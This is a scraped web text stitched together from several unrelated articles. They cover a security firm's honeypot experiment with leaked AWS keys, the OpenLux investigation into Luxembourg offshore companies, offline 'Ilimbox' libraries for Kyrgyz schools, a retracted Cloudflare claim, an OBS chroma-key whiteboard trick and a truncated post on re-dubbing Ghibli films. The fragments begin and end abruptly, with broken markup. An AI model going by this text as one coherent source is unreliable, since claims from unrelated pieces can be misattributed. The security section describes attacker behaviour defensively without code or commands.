<p>More recently, the sophisticated hack against IT management software giant SolarWinds could of originated from <a href="https://www.theregister.com/2020/12/16/solarwinds_github_password/" target="_blank" rel="nofollow">exposed file server credentials in an engineers GitHub repository</a>. This supply-chain attack and the resulting fallout will go down as one of the largest in history, joining the likes of WannaCry. The hack affected over 18,000 SolarWinds customers including various US federal agencies and tech-giants such as Microsoft and FireEye. As news of the hack broke, SolarWinds saw it's market cap cut in half and fall by billions of dollars after it's share price dipped below pre-IPO levels.</p>

<p>Thankfully these hard-hitting headlines are the exception and not the rule. We can look to publicly disclosed reports on bug bounty platforms such as HackerOne to get a feel for how often these secrets are being found and reported. At least by the good guys. These three reports from 2020 could easily have been a front page headline or resulted in huge regulatory fines — they got lucky.</p>
<ol>
<li>The <strong><a href="https://hackerone.com/reports/799898" target="_blank" rel="nofollow">U.S. Department of Defense</a></strong> exposed administrative credentials of their GitLab Enterprise server on GitHub, allowing access to their private code repositories.</li>
<li>Not for the first time, leaked credentials on GitHub from <strong><a href="https://hackerone.com/reports/694931" target="_blank" rel="nofollow">Equifax</a></strong> allowed for access to an API endpoint exposing PII information of Costa Rican citizens.</li>
<li><strong><a href="https://hackerone.com/reports/858915" target="_blank" rel="nofollow">Shopify</a></strong>'s leakage of a CircleCI API token on GitHub allowed for further access to private code repositories and their secrets within.</li>
</ol>
<p>Finding these secrets is what we do. Shhgit finds <strong>over 165,000 secrets every day single</strong> across public GitHub, GitLab and Bitbucket repositories. More than half of these are valid and live. And our data suggests it is an ever increasing problem that often goes unnoticed. You can catch a small glimpse of the scale of the problem <a href="https://www.shhgit.com/#product" target="_blank" rel="nofollow">on our homepage</a>:</p>

<h4>Code as an attack vector</h4>
<p>But what happens immediately after leaking secrets? To find out we purposely leaked valid Amazon AWS credentials to a public GitHub repository. We chose to leak AWS keys because we know they are highly sought after by fraudsters with all sorts of different motives — espionage, spamming, financial gain or blackmail. But we didn't quite realise how quickly it would happen...</p>
<p>We wanted to limit our liabilities as much as possible, even though we used a new AWS account loaded with free credits. We definitely do not want to be end up <a href="https://www.quora.com/My-AWS-account-was-hacked-and-I-have-a-50-000-bill-how-can-I-reduce-the-amount-I-need-to-pay" target="_blank" rel="nofollow">footing a huge bill</a> for this experiment. AWS' Cost Management tool alerts you if you go over a set budget but it will not stop you from going past it. To be on the safe side we created a script to automatically destroy any new EC2 instances <em>(servers)</em> shortly after their creation. This gives us enough time to forensically capture the server and analyse what the hackers were doing.</p>
<ol>
<li>
<p><strong>(15:12 UTC)</strong> First, we created a new <abbr title="AWS' Identity and Access Management tool">IAM</abbr> user and attached basic <abbr title="AWS' file storage platform known as buckets">S3</abbr> read and <abbr title="A fancy name for servers">EC2</abbr> policies. This means the account will only have permissions to access our file storage and spin up new cloud servers. We then published the AWS secret keys to a new GitHub repository.</p>

</li>
<li>
<p><strong>(15:16 UTC)</strong> Just four minutes later we receive an e-mail from the AWS team notifying us of the exposed credentials — neat!</p>

<p>Amazon automatically revokes exposed keys by applying a special policy called <em>AWSCompromisedKeyQuarantine</em>. This effectively prevents bad actors from using the key. But it somewhat renders our experiment useless if the keys can't be used. We knew this would happen beforehand so we created a simple script to automatically remove the quarantine policy if found <em>(tip: never do this)</em>. Now we just wait for fraudsters to take the bait.</p>
</li>
<li>
<p><strong>(15:17 UTC)</strong> Shhgit happened to be monitoring all activity by the user who leaked the secrets, so a minute later we received an e-mail alert of the leak.</p>

<li>
<p><strong>(15:18 UTC)</strong> A minute later we detected a flurry of activity on the key from an IP address based in the Netherlands. Threat intelligence feeds associates the IP address with spamming, exploitation of Windows hosts, and running a TOR exit node.</p>

<p>The first batch of commands helps the attacker understand the lay of the land. Shortly after the bad actor spun-up two <em>c6g.16xlarge</em> EC2 instances — AWS' most powerful compute instance. Undetected this would have costed us thousands of dollars a month. Any guesses on motives?</p>
<p>Cryptomining.</p>
<p>We analysed the server afterwards and it was a base install of Ubuntu with XMRig installed which is used to mine for $XMR (Monero) — nothing overly exciting.</p>
</li>
<li>
<p><strong>(15:54 UTC)</strong> Shortly after, another actor with an Israeli residential IP address used the secrets to access our S3 buckets (file storage) and download its entire contents (which we filled with random data). We booby-trapped some of the files with tracking pixels but unfortunately none of them triggered.</p>

<p>One attacker who copied the files from our S3 buckets started a live chat conversation through the shhgit.com homepage (the bucket was named shhgit) — a snippet of the conversation below.</p>

<p>Ultimately this ends up in a demand for money to pay him for his services in finding the 'bug'. We politely declined his generous offer. We believe this could have quickly turned in to an extortion attempt if the files were worth any value.</p>
</li>
<li>In total, the leaked secrets were used to access the AWS account 13 times over a 24 hour period. 4 of the attackers carried out actions similar to the above. The remaining 9 seemingly only verified if the credentials were valid (i.e. check if they could login). We presume to be either manually reviewed later or sold on a darknet forum.</li>
</ol>
<h4>6 minutes to compromise</h4>
<p>It look just 6 minutes for the malicious actor to find the leaked credentials on GitHub and compromise our AWS account. So why did we say 'in less than a minute' at the beginning of the post? Attacks like this are made possible by GitHub's "real time" feed. Every fork, code commit, comment, issue and pull request is fed in to a public events stream. Bad actors watch this stream to identify new code and scan it for secrets. GitHub delays the feed by 5 minutes — presumably for security reasons — making the <strong>earliest</strong> possible time a bad actor could have captured the secrets 15:17 UTC, 5 minutes after committing them.</p>
<h4>Keeping <em>your</em> secrets, secret</h4>
<p>Fraudsters <em>are</em> scanning public code repositories for your secrets. They are counting on you, or your team, or your suppliers, or your contractors, to mess up and take full advantage of it. As with all security controls, a defence in depth approach is always best so consider implementing the following:</p>
<ol>
<li>Don't put your secrets in your code in the first place. Secrets Management solutions such as <a href="https://www.vaultproject.io/use-cases/secrets-management" target="_blank" rel="nofollow">HashiCorp Vault</a> can help you here — think environment variables crossed with your password manager in your CI/CD pipelines.</li>
<li>Whilst Amazon caught and revoked our AWS keys shortly after them being committed, this isn't true for all secret types (e.g., database connection strings) or platforms (e.g., GitLab and Bitbucket). Strengthen your DevSecOps strategy with automated secrets detection to alert you if shhgit hits the fan. We happen to be really good at that.</li>
<li>Gain visibility of your code and understand where it sits and how it is secured. This is especially true if you have large teams or contractors distributed across many systems. A good first step is to monitor public GitHub, GitLab and Bitbucket streams. We happen to be really good at that too.</li>
<li>Implement the principle of least privilege across your secrets. Only grant them permissions needed to carry out their specific function and ensure they are only valid for as short as possible. Implement a zero trust model and plan for the worse by taking the position that your secrets <em>will</em> be breached. This will greatly mitigate the impact if any secrets are leaked.</li>

What would we find if we opened the safe of this tiny State located in the heart of the European Union, listed by many researchers in the world’s top&nbsp;5 tax havens&nbsp;? The OpenLux investigation, conducted by <em>Le Monde</em> along with ten media partners for more than a year, provides answers&nbsp;: 55,000&nbsp;offshore companies managing assets worth at least 6&nbsp;trillion euros.</p>          <p>These phantom companies without offices or employees were created by billionaires, multinationals, sportsmen, artists, high-ranking politicians and even royal families. Luxembourg acts as a magnet for the wealth of the world&nbsp;: in a territory of 2,586&nbsp;km2, Tiger Woods and Cristiano Ronaldo rub shoulders with Shakira and the King of Bahrain. Hundreds of multinationals (LVMH, Kering, Altice, Pfizer, Amazon…) have opened financial subsidiaries. Wealthy families increase their real estate assets there.</p>            <p>More surprisingly, OpenLux reveals that questionable funds, suspected of originating in criminal activity or linked to criminals targeted by judicial investigations, have been concealed in Luxembourg. This is the case of companies linked to the Italian Mafia, the’Ndrangheta, and the Russian underworld. The League, Italy’s far-right party, has hidden a secret fund which is sought by the Italian authorities. People close to the Venezuelan regime have recycled corrupt government procurement funds.</p>          <p>To conduct this investigation, <em>Le Monde </em>has compiled a huge database that lists the beneficiaries of the 124.000&nbsp;commercial companies registered in Luxembourg, i.e. their true owners, along with 3.3&nbsp;million administrative acts and financial reports. These are documents that have recently been made public, but are only available on the Luxembourg trade register website. <em>Le Monde </em>was able to extract them in their entirety for analysis, in partnership with the <em>Suddeutsche</em> <em>Zeitung </em>in Germany, <em>Le Soir</em> in Belgium, McClatchy in the United States, Woxx in Luxembourg, <em>IrpiMedia</em> in Italy, and the OCCRP Consortium of investigative journalists.</p>          <h2>157 nationalities represented</h2>          <p>These investigations confirm that the Grand Duchy is, contrary to what the Luxembourg authorities claim, a veritable offshore centre, halfway between the City of London and the British Virgin Islands. Nearly 90&nbsp;% of its <em>«&nbsp;companies&nbsp;»</em> are controlled by non-Luxembourgers. Among the 157&nbsp;nationalities represented in this amazing <em>«&nbsp;Who’s who&nbsp;»</em>, the French stand out&nbsp;: they head the list with, in total, more than 17.000 companies<strong>.</strong></p>            <p>What they house is surprising&nbsp;: valuable property, here a castle near Paris owned by a Saudi prince, there a vineyard in Provence owned by Angelina Jolie and Brad Pitt, and an endless list of villas on the French Riviera and well-appointed Parisian apartments. But also flagships of the French economy, such as Yves Rocher, Chanel, JCDecaux and Decathlon. It’s almost as if Luxembourg owned small pieces of France.</p>                     <p>The case of France is not isolated&nbsp;: it is also through Luxembourg companies that some investment funds buy whole swathes of cities such as Berlin and London, causing real estate prices to rocket without being identifiable or paying taxes. The list of international assets held in Luxembourg is a gigantic inventory, including luxurious residences, chalets, yachts, helicopters, private jets and big planes, music catalogues, the rights to images, works of art, in short, the list is endless.</p>          <p>In total, as confirmed by the list of 64,458&nbsp;beneficiaries identified by OpenLux&nbsp;: the Grand Duchy of Luxembourg concentrates a large part of the world’s wealth. It is home to at least 279 of the more than 2,000&nbsp;billionaires listed by <em>Forbes</em> magazine. But also 37 of the 50&nbsp;wealthiest French families, such as the Mulliez, Guerrand-Hermès and Bernard Arnault, who structure their group, their assets and their investments through dozens of Luxembourg holding companies.</p>          <h2>A prime location for tax planning</h2>          <p>There are various reasons for choosing Luxembourg&nbsp;: a central position in the European Union, high-quality financial engineering, financial regulations tailored to business, direct access to the country’s institutions, and political stability. But let there be no mistake&nbsp;: the first reasons are taxation and discretion. They are the result of political choices dating back to the time of former Prime Minister, Jean-Claude Juncker (1995-2013), who later became President of the European Commission.</p>            <p>Luxembourg has certainly turned its back on its former tax rescripts, these ultra- advantageous arrangements granted to large multinationals, following the revelations on the subject in 2014 by the <em>«&nbsp;LuxLeaks&nbsp;»</em> investigation. But it remains a hotbed of tax planning for companies and wealthy individuals through preferential tax regimes. This encourages, in some cases, abuse and, possibly, fraud.</p>          <p>The scale of the financial centre is such that the Grand Duchy seems, moreover, insufficiently equipped to guarantee effective control over all the flows it handles. Its services seem to be more calibrated to the size of the country than to its offshore activity. The trade register has only 59&nbsp;employees to enforce the legal obligation to declare the actual beneficiaries of more than 100.000&nbsp;entities and to carry out an initial control of the declarations. The Financial Sector Supervisory Commission (CSSF) has only 900 employees, even though the financial sector accounts for a quarter of the country’s economy.</p>          <p>Of course, Luxembourg is not the only country to have entered the race for the lowest tax bill. But this is the first time that an investigation has exhaustively documented the phenomenon, through the analysis of the microeconomic fabric of a State.</p>          <blockquote> <p>The many flaws discovered by the OpenLux investigation question the ability of States to effectively monitor their financial ecosystem</p> </blockquote>         <p>This truth operation would not have been possible without a directive voted by the European Union in 2018, which required the creation of public registers of the real owners of companies in all member states. This historic reform came after a decade of financial scandals, culminating in the <em>«&nbsp;Panama papers&nbsp;»</em> in 2016, that revealed the extent of the role played by opaque companies and offshore arrangements in laundering criminal activities, including tax fraud. A decade in which at the same time anti-corruption judges and tax authorities saw their investigations coming up against front companies and front men.</p>            <p>Luxembourg was one of the first to apply the European directive, making its register public in autumn 2019. In a way, it is therefore paying the price of transparency. The many flaws discovered by the OpenLux investigation question the ability of States to effectively monitor their financial ecosystem by guaranteeing the reliability of these registers. For example, almost half of the companies, funds and foundations registered in Luxembourg have no real identifiable beneficiaries to date. However, as the European directive states, <em>«&nbsp;public access to information on the actual recipients allows greater control of information by civil society (…) and helps to preserve confidence in the integrity of commercial transactions and the financial system&nbsp;»</em>.</p>                                 </section>    </article></div>]]>

<p>Zhazgul Zuridinova hikes for fun almost every month, but trekking the narrow mountain pass to Zardaly, a remote village near Kyrgyzstan’s southwest border, still makes her anxious. The 12-kilometer trail carved through the barren rocks is unpaved and bridged by wooden planks. One misstep could send her tumbling down the steep cliffs, a fate that has befallen many locals over the years.</p>



<p>“Zardaly is a place that no one goes to,” said Zuridinova, a 28-year-old project manager from Bishkek, the capital. “They don’t have the internet or electricity. While all the world is changing, they’re still living in the past, like a hundred years ago.”</p>



<p>It was Zardaly’s isolation that brought Zuridinova, two colleagues, and a donkey there last November. All three are employees of the Internet Society, a nonprofit that builds community broadband networks and teaches digital literacy around the world. Their aim was to bring the internet to the local school’s dozen students — who had been cut off from education during the coronavirus pandemic — using a tissue-box-sized digital library called Ilimbox.&nbsp;</p>



<p>The Ilimbox, whose name translates to “science in a box,” stores 500 books, 250 videos, and 4 million Wikipedia articles in Kyrgyz, Russian, and English. The device is only an interim solution for the lack of an internet connection — a thin facsimile of being online, but it has become a lifeline for students in the most remote areas of Kyrgyzstan, who faced being left behind <a href="https://www.unicef.org/kyrgyzstan/stories/lights-camera-action">when the country moved to e-learning last year</a>.&nbsp;</p>



<p>“It’s a window for a person who wants to access knowledge,” Zuridinova said. “It’s not the door.”</p>



<p>Building internet infrastructure has been a great challenge in Kyrgyzstan, which is further away from an ocean than any other country in the world and is almost entirely mountainous — 94% of the country lies at over 1,000 meters altitude. That makes laying cables expensive and difficult. <a href="https://www.internetworldstats.com/asia.htm#kg">More than 60% of Kyrgyzstan’s population</a> is still not covered by any form of internet, and those with a connection are concentrated in a handful of urban areas.</p>



<p>Talant Sultanov, co-founder of the Internet Society’s Kyrgyzstan chapter, first came across the concept of the “internet-in-a-box” when he attended the 2016 Internet Governance Forum in Mexico. The devices — repositories of downloaded internet content that can be accessed by offline communities — were being used <a href="https://vimeo.com/195038843">to connect indigenous communities in the Yucatán peninsula</a>.</p>



<p>“That’s when it occurred to us that, in Kyrgyzstan, we had a similar situation,” Sultanov said. “And that’s when we decided to also apply this experience in Kyrgyzstan and bring the internet-in-a-box to schools and libraries in remote areas.”</p>



<p>With funding from international organizations and an endorsement from the Ministry of Education, the project team — which most of the time comprised Zuridinova and one other engineer — created an Android app and assembled the boxes using low-cost microcomputers and hard drives. When connected to a power source, the Ilimbox becomes a local Wi-Fi hot spot, which students can use to install the app and download the content stored on the drive. The app also functions as a PDF reader and video player, so there’s no need to download other apps.</p>

<p>Even though there is no data network in rural Kyrgyzstan, many people there have Android smartphones, which are often brought in by Kygrgyz migrant workers living in neighboring countries.&nbsp;</p>



<p>Choosing content was a challenge. Schools in rural Kyrgyzstan have suffered from a lack of textbooks and other learning materials in the local language. Higher education institutions increasingly prefer to use Russian or English. “[Rural schools] have to share books or get worn-out books, if they’re lucky. And oftentimes they don’t even have that,” Sultanov said. That didn’t give the Internet Society much to work with. “There really wasn’t much to choose from, so we were happy just for any content,” Sultanov said. “We’re beggars, not choosers.”</p>



<p>Wikipedia has been a surprisingly important source of their material. There are currently more than 80,000 articles on the Kyrgyz version of the site, the majority of which were written after 2010 in <a href="https://www.opensocietyfoundations.org/voices/und-44">an effort </a><a href="https://www.opensocietyfoundations.org/voices/und-44">organized</a> <a href="https://www.opensocietyfoundations.org/voices/und-44">by Kyrgyzstani social worker Chorobek Saadanbekov</a>, who mobilized academics and college students to translate Wikipedia articles from other languages. Saadanbekov said he was motivated by his own experience of growing up in the countryside and receiving education in only Kyrgyz. “And now I have hopes in our country,” he told <em>Rest of World</em>, “that if you only speak Kyrgyz, you can [still] access knowledge.”&nbsp;</p>



<p>Between 2017 and early 2020, the Internet Society delivered Ilimboxes to around 100 schools across the country. But the urgency of their efforts increased dramatically last March, when the Covid-19 pandemic forced schools across the country to close. In August, the Ministry of Education announced that, of all public schools in Kyrgyzstan, 2,106 were already connected to the internet, while the state-owned telecommunications company was laying fiber optic cables for 11 more. Twenty schools, however, would be left out, either because they had no electricity or there were plans to resettle villagers in the future.</p>



<p>“When we learned that,” Sultanov said, “we took it as a challenge and a goal — that we should definitely go to these villages first.”</p>



<p>The school in Zardaly was on the list. The village has around 100 families but no electricity, fixed internet, or mobile data. On November 2, Zuridinova and two colleagues arrived at Zardaly after hours of driving and walking. They brought with them an Ilimbox, a big solar panel, some batteries, and two solar-powered streetlamps. The digital library was placed in the primary school, the only public institution in the village, and 11 students between 7 and 12 came to learn how to use it.</p>



<p>Many older students already had a smartphone, but the team had learned in advance that the only girl in the school, Raiana, didn’t. So, two weeks before the trip to Zardaly, they posted a request on Facebook asking if someone could donate a used handset. A woman saw the post, cleaned and repaired her phone, and sent it to the Ilimbox team. “Thank you, sister,” said Raiana, holding the phone and the Ilimbox in a video recorded by Zuridinova. “I took the phone. I will study hard.”&nbsp;</p>



<p>In Chakmak-Suu, another village on the list, a cell tower put up four years ago offers relatively stable mobile connections. There, Aitunuk Talaibekova, a 15-year-old student, has been able to send homework to her teachers over WhatsApp and conduct searches on Google. However, most of the information she finds online is in Russian.</p>



<p>Because she reads much quicker in Kyrgyz, her native language, she had to use a physical dictionary to translate material she didn’t understand. The Ilimbox, installed in her school in October, gave her access to all the Krygyz language content scattered around the internet and put it in one place.</p>



<p>“Learning has become more interesting for me,” she told <em>Rest of World</em>. “I used Wikipedia to study the biographies of historical figures, authors, and poets, for example, to find their poems that we had in our lessons.” She also uses it to look up textbooks, so she can help her younger siblings with their homework.</p>



<p>With the last of the remote schools connected in November, the Ilimbox team is now planning to expand the program to include Kyrgyzstan’s <a href="https://www.akdn.org/project/bringing-kindergarten-high-pastures">recently created <em>jailoo</em> kindergartens,</a> which allow thousands of children to receive preschool education while they keep an eye on grazing sheep in the pastures. Zuridinova and her colleagues decided to include the jailoos after realizing that the Ilimboxes could work without access to the electrical grid.</p>



<p>Zuridinova says that, the next time they visit Zardaly, she wants to bring the real internet to the village. “We thought about going there to teach [them] how to use Booking.com for tourists, how to use e-commerce websites,” she said. “Not only bringing the internet there, but also teaching [them] how to use it for work, study, and other things.”</p>

The claims contained in this article were incorrect. After another contact with Cloudflare support, it turned out that the Bot Fight Mode behaves differently for Free and PRO plans. That's what caused the instant improvement after upgrading. Another way to resolve the issues I was experiencing would have been to disable the bot fight mode altogether or add a custom page rule disabling it. My website never experienced any traffic throttling. I've decided to remove the article, to stop spreading the misinformation about CF services.

<p>I don't know if you've ever seen me present. I like to use whiteboards or flip charts, and that doesn't necessarily translate well to online presentations.</p>



<p>It was at least ten years ago when I had an idea about giving online presentations with a whiteboard, but where the whiteboard would be between me and the camera. A glassboard rather than a whiteboard, obviously, so that I would still be visible through the glass but not obscuring the text. And the image would be mirrored so that the things I wrote would be readable to the audience, given that I'd be drawing on the other side of it. Recently I've found out this is a real thing called <a rel="noreferrer noopener" aria-label="Lightboard (opens in a new tab)" href="https://library.iated.org/view/KOC2017LIG" target="_blank">Lightboard</a>, using ultra-clear glass and lights to make sure what's drawn glows enough. And considering this seems to have only appeared around 2015 (a good five years after I was musing about the concept), I really should've explored things further. </p>



<figure><img src="https://wiki.nus.edu.sg/download/attachments/135954958/lightboard.jpg?version=1&amp;modificationDate=1458616080983&amp;api=v2" alt=""><figcaption>This picture is from a site belonging to the <a rel="noreferrer noopener" aria-label="National University of Singapore (opens in a new tab)" href="https://wiki.nus.edu.sg/pages/viewpage.action?pageId=135954958" target="_blank">National University of Singapore</a>, but an image search gives plenty of examples</figcaption></figure>



<p>In a world where technical presentations are more online than in-person, I've struggled a bit with how to give my usual style of presentation. I know I could set up something like this, and I've been tempted, but it would be a lot of effort, and it's not exactly portable, and I just haven't (although I know at least one person who has…)</p>



<p>I know what you're thinking – and that's that tools like Teams do have whiteboards in their meetings. That's not what I want though – in those situations the main screen becomes white (or whatever colour the whiteboard background is), and the bit showing me disappears or shrinks to the corner. It's like sharing a screen. And my style isn't just writing on a whiteboard, it's pointing at the whiteboard, it's gesturing, it's all of that stuff that doesn't work if I'm constrained to the corner of the screen. If I had a greenscreen behind me I could do the "weatherperson" trick of moving in front of the screen to point things out, etc, but it's still not quite what I want.</p>



<p>And so I got to thinking about what could be done.</p>



<p>Enter OBS. That free piece of software that many people use now. Plus, from version 26 on, it can act as a Virtual Camera, so that Teams (or Zoom or GoTo or whatever) can show whatever OBS is doing. So if I figured if I could get this to behave the right way, I would be able to use it in live presentations. The button that appeared in version 26 is in the Controls pane in the bottom right of the OBS window. </p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12.png 306w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12-300x162.png 300w" sizes="(max-width: 306px) 100vw, 306px"></figure>



<p>There is no mode where I can just use my stylus to draw on the screen where my face is. At least I don't believe there is, but I found a workaround.</p>



<p>The basic concept here is that I use my webcam as a source, but overlay a window capture from an application where I can draw with my stylus (PowerPoint will do, and is good for other reasons too). Then I set the application's background to a <a rel="noreferrer noopener" aria-label="chroma key (opens in a new tab)" href="https://en.wikipedia.org/wiki/Chroma_key" target="_blank">chroma key</a> colour (like bright green #00FF00) and filter that out like a traditional greenscreen. I stretch that source in OBS bit so that the main drawing area is over my webcam feed, and all the menus and stuff is outside.</p>



<p>To explain with pictures:</p>



<p>I started with a plain PowerPoint presentation and set the background to bright green. I'm going to leave the PowerPoint application in this mode because I find it behaves better. And as I'm about to draw on it with a stylus, I don't want it to do anything weird by switching into 'presenter mode' or 'annotation mode' or anything like that.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-1024x598.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-1024x598.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-300x175.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-768x449.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Then in OBS, with the webcam as the bottom layer of the Sources, I add a Window Capture and use the PowerPoint screen.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1.png 483w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1-300x116.png 300w" sizes="(max-width: 483px) 100vw, 483px"></figure>



<p>Now select the WindowCapture and resize it to match the slide to the webcam. This slide is going to disappear though, when we add the filter.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/ResizingOBS.gif" alt=""></figure>



<p>Right-clicking on the "Window Capture" source, I can go to Filters and add a Chroma Key filter, using the default Green. You'll notice that the bits that are green in PowerPoint have gone grey, indicating that they'll be invisible.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3.png 863w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3-300x263.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3-768x675.png 768w" sizes="(max-width: 863px) 100vw, 863px"></figure>



<p>Now back in OBS, I see myself again..</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4.png 975w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4-300x223.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4-768x572.png 768w" sizes="(max-width: 975px) 100vw, 975px"></figure>



<p>…but when I write in PowerPoint, it appears in front of me. (Oh, because I want to point at the things I draw, I flip the webcam horizontally. You might have noticed the writing on my shirt is backwards.)</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-1024x593.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-1024x593.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-768x444.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And it's not just text that works. I can have standard bullet-point text.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-1024x594.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-1024x594.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-768x446.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And I can write in other colours too, just not green.</p>



<p>But that brings me to an interesting set of tricks.</p>



<p>The first one is to grab a screenshot of me on the webcam, and make it very saturated, and green. I can do this using just about any image editing tool. So now I have an image that looks like this.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7.png 759w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7-300x169.png 300w" sizes="(max-width: 759px) 100vw, 759px"></figure>



<p>I set this to my PowerPoint background, and I can easily see where I can draw and where I can't (assuming I don't move around too much).</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-1024x614.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-1024x614.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-300x180.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-768x461.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I can also add gridlines to help my handwriting stay neater, and help me make sure I don't run out of room.</p>



<p>But in many ways the biggest trick is around the flow of my presentation.</p>



<p>Part of why I use whiteboards and flipcharts is because I feel like they help the audience connect with me better. There's something about writing live that means that people feel like I'm doing it on the fly, being more responsive to how the audience is responding, changing tack as I go. </p>



<p>But it's not like that at all. When I present without slides, or even without a computer, I have to know my material really well. I have to know where I'm going. I don't have the crutch of a slide deck of bullet points. I need to know what I'm planning to write. How I'm going to make the various points. Even how the audience is likely to respond to various things. By knowing the narrative of my presentation really well, it gives me the freedom to move around the content if I feel like I need to, but I have to know my anchor points in my head, because I don't have them on the screen.</p>



<p>So… as long as they're still green, and therefore invisible to the audience, I can indeed have them on the screen now. And whether I use consecutive slides with different colours (first green, then white/black/whatever) to make it look like it's building, or whether I trace over the top using my stylus, I can have all the notes I like – even notes to myself that the audience can't see. I can have as many slides as I want and can move around them just like regular folk do.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-1024x594.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-1024x594.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-768x445.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>When it comes to giving demos, I still need to add a separate screen or do traditional screensharing through Teams or GoTo or Zoom or whatever. But with a bit more effort I could do my demo in the background and still draw over the top. Or get a physical greenscreen behind me so that I can have a solid background or demo screen behind me and still have my drawings in the foreground. This can definitely go a lot further.</p>



<p>But for my whiteboard-based presentations, this should work nicely.</p>



<p><a href="http://twitter.com/rob_farley" target="_blank" rel="noreferrer noopener" aria-label="@rob_farley (opens in a new tab)">@rob_farley</a> </p>



<p>PS: I just made a short video at <a rel="noreferrer noopener" aria-label="https://youtu.be/LdtmEf2XhSU (opens in a new tab)" href="https://youtu.be/LdtmEf2XhSU" target="_blank">https://youtu.be/LdtmEf2XhSU</a> to show drawing on the screen. It would've been better if I had taken a few minutes to sort out my lighting and background, but you can see the rough concept there.</p>

                    <p>We have children in the family learning both English and Cantonese simultaneously, a great way to help support this will be to show them films that they will love in their mother tongue, and what better films to show children but films by Studio Ghibli? </p><p>But here's the problem: &nbsp;Studio Ghibli films are in Japanese (naturally), but fortunately they've been translated into many languages and distributed world wide. Even better, they're now even available on Netflix. However, for simplicities sake, you tend to only be able to get the translated version for the country or region that you're living in, so for the UK...

Not DVDs, <strong>VCDs</strong>. These seemed to come and go pretty quickly in the west, being replaced by DVDs. In Asia however, VCDs were popular for far longer (<a href="https://en.wikipedia.org/wiki/Video_CD#In_Asia">https://en.wikipedia.org/wiki/Video_CD#In_Asia</a>). VCDs have two main problems when using them in 2021: Firstly, the quality can only be accurately summarised as "<a href="https://knowyourmeme.com/memes/recorded-with-a-potato">Potato</a>". Secondly, because a CD is limited to 700MB, the film has to be split in half across two disks. A bit pants in this modern day and age really!</p><p>But let's not look a gift horse in the mouth, there is definitely something we can do with these!</p><p>I already own almost all of the UK releases of the Ghibli films, so now I had the perfect source material; High Quality video from the Blu Ray versions of the films, along with relatively decent Cantonese dubbing of the same film on VCD.

<ol>
<li>Rip the Blu Ray and VCD versions to my computer.</li>
<li>Extract the Cantonese Dub from the VCD version.</li>
<li>Add it as a new language track on the extracted mp4.</li>
<li>Enjoy a classic film in a new language on my HD TV.</li>
</ol>
<p>Alas, the best made plans, often go awry..</p>
<ul>
<li>The VCD films are split int two, meaning they need to be re-joined (Nothing a little ffmpeg magic can't do!).</li>
<li>The Join in the middle is sometimes, but not always exact, meaning that there may be milliseconds missing in the middle when compared to the full length film.</li>
<li>The VCD film and Blu Ray films are not entirely identical, the VCDs have a black screen with the name of the local distributor at the start for a few seconds (of varying length).</li>
</ul>
